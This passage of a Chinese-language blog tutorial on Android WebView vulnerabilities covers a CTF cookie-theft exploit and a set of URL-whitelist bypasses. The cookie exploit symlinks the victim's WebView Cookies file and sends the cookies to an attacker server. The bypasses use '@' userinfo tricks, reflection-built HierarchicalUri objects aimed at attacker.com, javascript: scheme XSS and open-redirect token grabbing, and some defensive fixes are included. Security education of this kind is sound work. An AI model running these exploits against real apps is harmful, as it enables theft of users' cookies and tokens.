class=\"keyword\">function</span>(<span class=\"params\"></span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">         location.<span class=\"property\">href</span> = <span class=\"string\">&#x27;intent:#Intent;component=com.bytectf.easydroid/.TestActivity;S.url=file%3A%2Fdata%2Fuser%2F0%2Fcom.bytectf.pwneasydroid%2Fsymlink.html;end&#x27;</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">     &#125;, <span class=\"number\">40000</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>攻击代码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onCreate</span><span class=\"params\">(Bundle savedInstanceState)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">super</span>.onCreate(savedInstanceState);</span><br><span class=\"line\">    setContentView(R.layout.activity_main);</span><br><span class=\"line\">    symlink();</span><br><span class=\"line\">    Intent intent \\= <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>();</span><br><span class=\"line\">    intent.setClassName(<span class=\"string\">&quot;com.bytectf.easydroid&quot;</span>,<span class=\"string\">&quot;com.bytectf.easydroid.MainActivity&quot;</span>);</span><br><span class=\"line\">    intent.setData(Uri.parse(<span class=\"string\">&quot;http://toutiao.com@****/easydroid.html&quot;</span>));</span><br><span class=\"line\">    startActivity(intent);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span> String <span class=\"title function_\">symlink</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\"><span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">    String root \\= getApplicationInfo().dataDir;</span><br><span class=\"line\">    String symlink \\= root + <span class=\"string\">&quot;/symlink.html&quot;</span>;</span><br><span class=\"line\">    String cookies \\= getPackageManager().getApplicationInfo(<span class=\"string\">&quot;com.bytectf.easydroid&quot;</span>, <span class=\"number\">0</span>).dataDir + <span class=\"string\">&quot;/app_webview/Cookies&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    Runtime.getRuntime().exec(<span class=\"string\">&quot;rm &quot;</span> + symlink).waitFor();</span><br><span class=\"line\">    Runtime.getRuntime().exec(<span class=\"string\">&quot;ln -s &quot;</span> + cookies + <span class=\"string\">&quot; &quot;</span> + symlink).waitFor();</span><br><span class=\"line\">    Runtime.getRuntime().exec(<span class=\"string\">&quot;chmod -R 777 &quot;</span> + root).waitFor();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> symlink;</span><br><span class=\"line\">&#125; <span class=\"keyword\">catch</span> (Throwable th) &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">RuntimeException</span>(th);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>通过Intent重定向，首先加载exp.html来设置cookie，然后再加载symlink.html，将所要Cookies内容返回给我们的服务器。最终达到窃取Cookies的目的。注意，这里要保证setAllowFileAccess(true)，API 29以下默认为true，否则会利用失败</p>\n<p>效果显示：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/75.png\" alt=\"image-20220730141455146\"></p>\n<h3 id=\"3-URL配置漏洞\"><a href=\"#3-URL配置漏洞\" class=\"headerlink\" title=\"3.URL配置漏洞\"></a>3.URL配置漏洞</h3><p>在WebView漏洞中，许多URL可以通过各种方式去绕过验证，从而引起各式各样的漏洞</p>\n<p>URL的结构如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">scheme://login:password@address:port/path/to/resource/?query_string#fragment</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>scheme<br>不区分大小写，包括http、https、file、ftp等等,:之后的“&#x2F;&#x2F;”可省略，例如http:<a href=\"http://www.qq.com/\">www.qq.com</a>, 此外，多数浏览器在scheme之前加空格也是可以正常解析的</li>\n<li>login:password@（认证信息）<br>服务器有时候需要用户名和密码认证，ftp协议比较常见，http很少见，但这个不常见字段往往可以绕过很多检查</li>\n<li>address<br>address字段可以是一个不区分大小写的域名、一个ipv4地址或带方括号的ipv6地址，部分浏览器接收ip地址的八进制、十进制、十六进制等写法</li>\n<li>port<br>端口号</li>\n<li>&#x2F;path&#x2F;to&#x2F;resource<br>层级路径，可以使用“..&#x2F;”到上一级目录</li>\n<li>query_string<br>查询字符串，格式为”query_string?name1&#x3D;value1&amp;name2&#x3D;value2”</li>\n<li>fragment<br>用于html中的页面定位</li>\n</ul>\n<h4 id=\"（1）URL绕过漏洞\"><a href=\"#（1）URL绕过漏洞\" class=\"headerlink\" title=\"（1）URL绕过漏洞\"></a>（1）URL绕过漏洞</h4><p><strong>漏洞原理：</strong></p>\n<h5 id=\"lt-1-gt-通用的URL绕过\"><a href=\"#lt-1-gt-通用的URL绕过\" class=\"headerlink\" title=\"&lt;1&gt;通用的URL绕过\"></a>&lt;1&gt;通用的URL绕过</h5><p>首先我们来看一个简单的url校验例子：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(checkDomain(url))&#123;</span><br><span class=\"line\">\tenableJavaScriptInterface();</span><br><span class=\"line\">\t<span class=\"comment\">//或者webview.load(url)</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里是对url进行域名校验，然后开启我们的<code>enableJavaScriptInterface</code>接口可以访问js文件</p>\n<p>我们在实际中会发现这样的例子：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(url.startsWith(<span class=\"string\">&quot;file://&quot;</span>))&#123;</span><br><span class=\"line\">\tsetJavaScriptEnbled(<span class=\"literal\">false</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\tsetJavaScriptEnbled(<span class=\"literal\">true</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>很明显这里是开发者为了防止加载file的同源策略进行的防护，但是我们有很多的绕过方法：</p>\n<p>总结：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">(<span class=\"number\">1</span>) 大写字母 “File:<span class=\"comment\">//”</span></span><br><span class=\"line\">(<span class=\"number\">2</span>) 前面加上空格： “ file:<span class=\"comment\">//”</span></span><br><span class=\"line\">(<span class=\"number\">3</span>) 字符编码：“file：%<span class=\"number\">2F</span>/”</span><br><span class=\"line\">(<span class=\"number\">4</span>) 可正常访问的畸形路径：“file:sdcard/attack/html” 或 “file:/\\<span class=\"comment\">//sdcard/attack.html”</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"lt-2-gt-常见的url校验\"><a href=\"#lt-2-gt-常见的url校验\" class=\"headerlink\" title=\"&lt;2&gt; 常见的url校验\"></a>&lt;2&gt; 常见的url校验</h5><p>我们还可以发现在一般的url中会对首尾进行校验</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(host.endsWith(<span class=\"string\">&quot;mysite.com&quot;</span>))&#123;</span><br><span class=\"line\">\tenableJavascriptInterface();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>存在问题：endWith未闭合点号</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">绕过：evilmysite.com</span><br><span class=\"line\">修复：endsWith(<span class=\"string\">&quot;.mysite.com&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>使⽤startsWith、contains、indexOf、正则匹配等⾮严格字符串匹配</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(host.startsWith(<span class=\"string\">&quot;mysite.com&quot;</span>))&#123;</span><br><span class=\"line\">\tenableJavascriptInterface();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">绕过：mysite.com@oppo.com</span><br></pre></td></tr></table></figure>\n\n<p><strong>contains+indexOf绕过：</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">任何可以添加字符串的字段</span><br><span class=\"line\">子域名 huawei.com.mysite.com</span><br><span class=\"line\">子路径 mysite.com/huawei.com</span><br><span class=\"line\">参数 mysite.com/xxxx#huawei.com</span><br></pre></td></tr></table></figure>\n\n<p><strong>&#x2F;&#x2F;和第一个&#x2F;之间提取host</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"type\">boolean</span> <span class=\"title function_\">checkDomain</span><span class=\"params\">(String inputUrl)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    String[] whiteList=<span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[]&#123;<span class=\"string\">&quot;huawei.com&quot;</span>,<span class=\"string\">&quot;hicloud.com&quot;</span>&#125;;</span><br><span class=\"line\">    String tempStr=inputUrl.replace(<span class=\"string\">&quot;://&quot;</span>,<span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">    String inputDomain=tempStr.substring(<span class=\"number\">0</span>,tempStr.indexOf(<span class=\"string\">&quot;/&quot;</span>)); <span class=\"comment\">//提取host</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (String whiteDomain:whiteList)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (inputDomain.indexOf(whiteDomain)&gt;<span class=\"number\">0</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span>  <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>绕过方式：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">子域名 huawei.com.mysite.com</span><br><span class=\"line\">http:<span class=\"comment\">//huawei.com@www.rebeyond.net/poc.htm</span></span><br><span class=\"line\">http:<span class=\"comment\">//a:a@www.huawei.com:b@www.baidu.com 在android中使用getHost获取到的是huawei.com,但实际访问的是baidu.com</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>漏洞复现：</strong></p>\n<p>我们打开一个样本APP，分析其代码块：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/45.png\" alt=\"image-20220729211137555\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/46.png\" alt=\"image-20220729211156801\"></p>\n<p>这里我们可以简单的发现代码对URL的相应部分进行了校验，这样我们就可以进行构造</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot;insecureshop://com.insecureshop/web?url=https://www.baidu.com&quot;</span><br><span class=\"line\">&quot;insecureshop://com.insecureshop/webview?url=http://www.baidu.com?-insecureshopapp.com&quot;</span><br></pre></td></tr></table></figure>\n\n<p>我们构造了两条URL，然后可以绕过检验，然后我们直接启动</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">adb shell am start -W -a android.intent.action.VIEW -d URI的值</span><br></pre></td></tr></table></figure>\n\n<p>效果如下：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/47.png\" alt=\"image-20220729211417226\"></p>\n<p>这里我们可以实现任意的URI的访问和跳转</p>\n<h4 id=\"（2）hearachical-Uri绕过\"><a href=\"#（2）hearachical-Uri绕过\" class=\"headerlink\" title=\"（2）hearachical Uri绕过\"></a>（2）hearachical Uri绕过</h4><p>假设我们加载的Uri不是通过Uri.parse，而是通过外部直接获取，我们可以构造hearachical  来绕过</p>\n<p>我们可以使用 HierarchicalUri 和 Java Reflection API 进行攻击，同样我们分析一个样本的URL验证</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Uri</span> <span class=\"variable\">uri</span> <span class=\"operator\">=</span> getIntent().getData();</span><br><span class=\"line\">   <span class=\"type\">boolean</span> <span class=\"variable\">isValidUrl</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;https&quot;</span>.equals(uri.getScheme()) &amp;&amp; uri.getUserInfo() == <span class=\"literal\">null</span> &amp;&amp; <span class=\"string\">&quot;legitimate.com&quot;</span>.equals(uri.getHost());</span><br><span class=\"line\">   <span class=\"keyword\">if</span> (isValidUrl) &#123;</span><br><span class=\"line\">       webView.loadUrl(uri.toString(), getAuthHeaders());</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>android.net.Uri</code>在Android上被广泛使用，但实际上它是一个抽象类。<code>android.net.Uri$HierarchicalUri</code>是它的子类之一。Java 反射 API 使创建能够绕过此检查的 Uri 成为可能。</p>\n<p>通过反射传⼊⼀个scheme、authoritiy和path，构造⼀个形式为<a href=\"http://legitimate.com@attacker.com的hierachicaluri实例即可绕过/\">http://legitimate.com@attacker.com的HierachicalUri实例即可绕过</a></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">MainActivity</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Activity</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onCreate</span><span class=\"params\">(Bundle savedInstanceState)</span> &#123;</span><br><span class=\"line\">            <span class=\"built_in\">super</span>.onCreate(savedInstanceState);</span><br><span class=\"line\"></span><br><span class=\"line\">            Uri uri;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                <span class=\"comment\">//java反射获取类引用</span></span><br><span class=\"line\">                <span class=\"type\">Class</span> <span class=\"variable\">partClass</span> <span class=\"operator\">=</span> Class.forName(<span class=\"string\">&quot;android.net.Uri$Part&quot;</span>);</span><br><span class=\"line\">                <span class=\"type\">Constructor</span> <span class=\"variable\">partConstructor</span> <span class=\"operator\">=</span> partClass.getDeclaredConstructors()[<span class=\"number\">0</span>];</span><br><span class=\"line\">                partConstructor.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"type\">Class</span> <span class=\"variable\">pathPartClass</span> <span class=\"operator\">=</span> Class.forName(<span class=\"string\">&quot;android.net.Uri$PathPart&quot;</span>);</span><br><span class=\"line\">                <span class=\"type\">Constructor</span> <span class=\"variable\">pathPartConstructor</span> <span class=\"operator\">=</span> pathPartClass.getDeclaredConstructors()[<span class=\"number\">0</span>];</span><br><span class=\"line\">                pathPartConstructor.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"type\">Class</span> <span class=\"variable\">hierarchicalUriClass</span> <span class=\"operator\">=</span> Class.forName(<span class=\"string\">&quot;android.net.Uri$HierarchicalUri&quot;</span>);</span><br><span class=\"line\">                <span class=\"type\">Constructor</span> <span class=\"variable\">hierarchicalUriConstructor</span> <span class=\"operator\">=</span> hierarchicalUriClass.getDeclaredConstructors()[<span class=\"number\">0</span>];</span><br><span class=\"line\">                hierarchicalUriConstructor.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">\t\t\t   </span><br><span class=\"line\">                <span class=\"comment\">//构造HierachicalUri实例</span></span><br><span class=\"line\">                <span class=\"type\">Object</span> <span class=\"variable\">authority</span> <span class=\"operator\">=</span> partConstructor.newInstance(<span class=\"string\">&quot;legitimate.com&quot;</span>, <span class=\"string\">&quot;legitimate.com&quot;</span>);</span><br><span class=\"line\">                <span class=\"type\">Object</span> <span class=\"variable\">path</span> <span class=\"operator\">=</span> pathPartConstructor.newInstance(<span class=\"string\">&quot;@attacker.com&quot;</span>, <span class=\"string\">&quot;@attacker.com&quot;</span>);</span><br><span class=\"line\">                uri = (Uri) hierarchicalUriConstructor.newInstance(<span class=\"string\">&quot;https&quot;</span>, authority, path, <span class=\"literal\">null</span>, <span class=\"literal\">null</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">RuntimeException</span>(e);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"type\">Intent</span> <span class=\"variable\">intent</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>();</span><br><span class=\"line\">            intent.setData(uri);</span><br><span class=\"line\">            intent.setClass(<span class=\"built_in\">this</span>, TestActivity.class);</span><br><span class=\"line\">            startActivity(intent);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>文件<code>TestActivity.java</code>：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TestActivity</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Activity</span> &#123;</span><br><span class=\"line\">     <span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onCreate</span><span class=\"params\">(Bundle savedInstanceState)</span> &#123;</span><br><span class=\"line\">         <span class=\"built_in\">super</span>.onCreate(savedInstanceState);</span><br><span class=\"line\"></span><br><span class=\"line\">         <span class=\"type\">Intent</span> <span class=\"variable\">intent</span> <span class=\"operator\">=</span> getIntent();</span><br><span class=\"line\">         <span class=\"type\">Uri</span> <span class=\"variable\">uri</span> <span class=\"operator\">=</span> intent.getData();</span><br><span class=\"line\"></span><br><span class=\"line\">         Log.d(<span class=\"string\">&quot;evil&quot;</span>, <span class=\"string\">&quot;Scheme: &quot;</span> + uri.getScheme());</span><br><span class=\"line\">         Log.d(<span class=\"string\">&quot;evil&quot;</span>, <span class=\"string\">&quot;UserInfo: &quot;</span> + uri.getUserInfo());</span><br><span class=\"line\">         Log.d(<span class=\"string\">&quot;evil&quot;</span>, <span class=\"string\">&quot;Host: &quot;</span> + uri.getHost());</span><br><span class=\"line\">         Log.d(<span class=\"string\">&quot;evil&quot;</span>, <span class=\"string\">&quot;toString(): &quot;</span> + uri.toString());</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n\n<p>然后可以获得日志信息：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/48.png\" alt=\"image-20220729212609157\"></p>\n<p>漏洞防护：</p>\n<p>我们只需要让攻击的应用程序获取<code>Uri</code>攻击者控制的对象并专门使用该对象</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Uri uri = Uri.parse(intent.getData().toString());</span><br></pre></td></tr></table></figure>\n\n<p>从 API 级别 28 (Android 9) 开始，<a href=\"https://developer.android.com/guide/app-compatibility/restrictions-non-sdk-interfaces\">禁止</a>使用内部接口——但这可以通过使用<a href=\"https://github.com/ChickenHook/RestrictionBypass\">RestrictionBypass</a>等工具轻松绕过</p>\n<h4 id=\"（3）URL-Scheme绕过\"><a href=\"#（3）URL-Scheme绕过\" class=\"headerlink\" title=\"（3）URL Scheme绕过\"></a>（3）URL Scheme绕过</h4><p><strong>漏洞原理：</strong></p>\n<p>代码在进行URL校验是，检查了host，但是并未检查scheme，这样我们可以通过“javascript”进行绕过</p>\n<p>例如：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/69.png\" alt=\"image-20220730132455921\"></p>\n<p>也可以通过<code>file://www.mysite.com/sdcard/evil.html</code>绕过，某些版本WebView可正常解析为<code>file:///sdcard/evil.html</code></p>\n<p><strong>漏洞复现：</strong></p>\n<p>我们打开一个样本：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/70.png\" alt=\"image-20220730132644522\"></p>\n<p>然后进行构造html</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/71.png\" alt=\"image-20220730132704180\"></p>\n<p>最后就绕过了校验，实现了XSS注入</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/72.png\" alt=\"image-20220730132735229\"></p>\n<p><strong>安全防护：</strong></p>\n<p>URL校验函数</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/73.png\" alt=\"image-20220730132918854\"></p>\n<p>Intent Scheme校验建议写法：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span><span class=\"comment\">//解析Intent Scheme URL</span></span><br><span class=\"line\"><span class=\"number\">2.</span> <span class=\"type\">Intent</span> <span class=\"variable\">intent</span> <span class=\"operator\">=</span> Intent.parseUri(uri， flags);</span><br><span class=\"line\"><span class=\"number\">3.</span><span class=\"comment\">//禁止打开没有BROWSABLE标签的Activity</span></span><br><span class=\"line\"><span class=\"number\">4.</span> intent.addCategory ( <span class=\"string\">&quot;android.intent.category.BROWSABLE&quot;</span> );</span><br><span class=\"line\"><span class=\"number\">5.</span><span class=\"comment\">//禁止设置intent的组件</span></span><br><span class=\"line\"><span class=\"number\">6.</span> intent.setComponent( nu1l);</span><br><span class=\"line\"><span class=\"number\">7.</span><span class=\"comment\">//禁止设置intent的selector</span></span><br><span class=\"line\"><span class=\"number\">8.</span> intent.setSelector(nul1);</span><br><span class=\"line\"><span class=\"number\">9.</span><span class=\"comment\">//打开intent指向的activity</span></span><br><span class=\"line\"><span class=\"number\">10.</span>context.startActivityIfNeeded(intent，-<span class=\"number\">1</span>);</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"（4）服务端跳转漏洞绕过\"><a href=\"#（4）服务端跳转漏洞绕过\" class=\"headerlink\" title=\"（4）服务端跳转漏洞绕过\"></a>（4）服务端跳转漏洞绕过</h4><p><strong>漏洞原理：</strong></p>\n<p>⽩名单域名内的服务端出现跳转漏洞时，仍然可以通过检查，并调⽤<code>javascriptInterface</code>，例如我们构造一个这样的URL:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://www.site1.com/redirect.php?url=https://www.baidu.com</span><br></pre></td></tr></table></figure>\n\n<p>前面的<code>https://www.site1.com/redirect.php</code>是我们构造的虚拟的站点，当主机访问时，打开这个URL后，服务器会返回一个302响应，然后浏览器侧会斩词请求Location中指定的URL，对于具有单点登录功能的网站，这种类型的接口很常见。</p>\n<p>然后我们就可以构造URL来绕过域名白名单：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://www.site1.com/redirect.php?url=http://223.****.32:8080/poc.htm</span><br></pre></td></tr></table></figure>\n\n<p><strong>漏洞复现：</strong></p>\n<p>首先我们编写攻击的htm：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"title function_\">alert</span>(<span class=\"variable language_\">window</span>.<span class=\"property\">myObj</span>.<span class=\"title function_\">getToken</span>());</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>然后我们使用文件服务器来进行模拟</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/49.png\" alt=\"image-20220730114753663\"></p>\n<p>我们接着编写测试样本代码</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">URLWebView</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AppCompatActivity</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">class</span> <span class=\"title class_\">JsObject</span> &#123;</span><br><span class=\"line\">        <span class=\"meta\">@JavascriptInterface</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> String <span class=\"title function_\">getToken</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            Log.e(<span class=\"string\">&quot;rebeyond&quot;</span>,<span class=\"string\">&quot;i am in getToken&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;&#123;\\&quot;token\\&quot;:\\&quot;1234567890abcdefg\\&quot;&#125;&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onCreate</span><span class=\"params\">(Bundle savedInstanceState)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>.onCreate(savedInstanceState);</span><br><span class=\"line\">        setContentView(R.layout.activity_url_web_view);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">WebView</span> <span class=\"variable\">webView</span> <span class=\"operator\">=</span> (WebView) findViewById(R.id.Wind_webview4);</span><br><span class=\"line\">        webView.getSettings().setJavaScriptEnabled(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        webView.setWebViewClient(<span class=\"keyword\">new</span> <span class=\"title class_\">WebViewClient</span>());</span><br><span class=\"line\">        webView.setWebChromeClient(<span class=\"keyword\">new</span> <span class=\"title class_\">WebChromeClient</span>());</span><br><span class=\"line\">        webView.addJavascriptInterface(<span class=\"keyword\">new</span> <span class=\"title class_\">JsObject</span>(),<span class=\"string\">&quot;myObj&quot;</span>);</span><br><span class=\"line\">        String inputUrl=<span class=\"string\">&quot;https://www.site1.com/redirect.php?url=http://223.****:8080/poc.htm&quot;</span>; <span class=\"comment\">//ip地址自己写自己的</span></span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (checkDomain(inputUrl))</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                Log.e(<span class=\"string\">&quot;rebeyond&quot;</span>,<span class=\"string\">&quot;i am a white domain&quot;</span>);</span><br><span class=\"line\">                <span class=\"comment\">//webView.loadUrl(inputUrl);</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (URISyntaxException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"type\">boolean</span> <span class=\"title function_\">checkDomain</span><span class=\"params\">(String inputUrl)</span> <span class=\"keyword\">throws</span>  URISyntaxException &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!inputUrl.startsWith(<span class=\"string\">&quot;http://&quot;</span>)&amp;&amp;!inputUrl.startsWith(<span class=\"string\">&quot;https://&quot;</span>))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        String[] whiteList=<span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[]&#123;<span class=\"string\">&quot;site1.com&quot;</span>,<span class=\"string\">&quot;site2.com&quot;</span>&#125;;</span><br><span class=\"line\">        java.net.URI url=<span class=\"keyword\">new</span> <span class=\"title class_\">java</span>.net.URI(inputUrl);</span><br><span class=\"line\">        String inputDomain=url.getHost(); <span class=\"comment\">//提取host</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (String whiteDomain:whiteList)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (inputDomain.endsWith(<span class=\"string\">&quot;.&quot;</span>+whiteDomain)) <span class=\"comment\">//www.site1.com      app.site2.com</span></span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span>  <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>这里我们可以分析代码中有一个白名单的域名检测函数<code>checkDomain</code>,但是我们可以通过构造URL来绕过：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://www.site1.com/redirect.php?url=http://223.****:8080/poc.htm</span><br></pre></td></tr></table></figure>\n\n<p>然后我们启动应用：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/50.png\" alt=\"image-20220730115108664\"></p>\n<p>我们点击白名单绕过按钮：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/51.png\" alt=\"image-20220730115207759\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/52.png\" 